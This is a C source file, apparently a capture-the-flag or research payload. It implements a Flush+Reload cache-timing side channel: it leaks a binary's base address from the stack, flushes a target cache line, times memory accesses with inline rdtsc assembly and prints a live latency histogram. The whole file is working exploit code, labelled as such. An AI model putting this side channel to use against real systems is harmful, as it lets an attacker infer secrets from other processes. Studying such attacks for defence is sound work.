#include "cacheutils.h"
#include "utils.h"
#include <asm/unistd_64.h>
#include <stdint.h>
#include <sys/mman.h>
#include <asm/unistd.h>

#define loop(var, end)for (int var = 0; var < (end); var++)
#define flush(addr)_mm_clflush((const void *)(addr))
#define clamp(victim, low, high)(victim > (high) ? (high) : MAX(low, victim))

#define LBOUND (80)
#define CYCLES (150)

u64 time_access(u64 addr);

void memset(void *dst, char ch, size_t cnt) {
    for (size_t i = 0; i < cnt; i++) {
        *(char *)(dst + i) = ch;
    }
}

void rep(u64 count, char ch) {
    char buf[128];
    memset(buf, ch, count);
    syscall(1, 1, &buf, count);
}

int exploit(u64* stack, int idx) {
    u64 retaddr = *(stack + 1);
    u64 victim = retaddr - 0x12ff;

    print("filebase: "); hex(victim); putchar('\n');

    u64 offset = 0x1400;
    flush(victim + offset);

    int hit_flush[CYCLES] = {0};
    int miss_flush[CYCLES] = {0};
    int max = 1;
    int iter = 0;

    while (1) {
        // loop(i, 1024 * 64) {
        //     flush(victim + offset);

        //     delay(1000);

        //     u64 clk = time_access(victim + offset);
        //     int idx = clamp(clk, LBOUND, CYCLES-1);
        //     miss_flush[idx]++;
        //     if (idx != LBOUND) max = MAX(max, miss_flush[idx]);
        // }

        // u64 tmp;
        // loop(i, 1024 * 64) {
        //     flush(victim + offset);
        //     maccess(victim + offset);
        //     maccess(victim + offset);
        //     maccess(victim + offset);
        //     maccess(victim + offset);

        //     delay(1000);

        //     u64 clk = time_access(victim + offset);
        //     int idx = clamp(clk, LBOUND, CYCLES-1);
        //     hit_flush[idx]++;
        //     if (idx != LBOUND) max = MAX(max, hit_flush[idx]);

        //     // if (i % 4096 == 0) {
        //     //     print("clk: "); dec(clk); putchar('\n');
        //     // }
        // }

        u64 clk = time_access(victim + offset);
        int idx = clamp(clk, LBOUND, CYCLES-1);
        miss_flush[idx]++;
        if (idx != LBOUND) max = MAX(max, miss_flush[idx]);
        delay(1000);

        iter++;
        if (iter % (1 << 23) != 0) continue;

        // if (iter % (1 << 9) == 0) {
        //     memset(hit_flush, 0, sizeof(hit_flush));
        //     memset(miss_flush, 0, sizeof(miss_flush));
        //     max = 1;
        // }

        print("\033[2J\033[1;1H");
        for (int i = LBOUND; i < CYCLES; i++) {
            int pad = 3 - dec(i);
            rep(pad, ' ');
            print(" | ");
            int height = MIN(32, (double)(miss_flush[i] * 32) / (double)max);
            rep(height, '>');
            rep(32-height, ' ');
            print(" | ");
            height = MIN(32, (double)(hit_flush[i] * 32) / (double)max);
            rep(32-height, ' ');
            rep(height, '<');
            print(" |\n");
            delay(1000);
        }
    }

    return 0;
}

void __attribute__((section(".entry"))) main () {
    u64* stack;
    asm volatile(
        "mov %[stack], rsp\n"
        : [stack] "=r" (stack)
    );
    exploit(stack, 3);
    print("[+] exploit done\n");
    exit(7);
}

__attribute__((naked, noinline))
u64 time_access(u64 addr) {
    asm volatile(
        "mfence\n"
        "lfence\n"
        // "mfence\n"

        "rdtsc\n"

        "lfence\n"
        // "mfence\n"

        "mov rsi, rax\n"
        "mov rax, qword ptr [rdi]\n"
        // "clflush byte ptr [rdi]\n"
        // "prefetchnta byte ptr [rdi]\n"

        "lfence\n"
        // "mfence\n"

        "rdtsc\n"

        "sub rax, rsi\n"
        "ret\n"
    );
}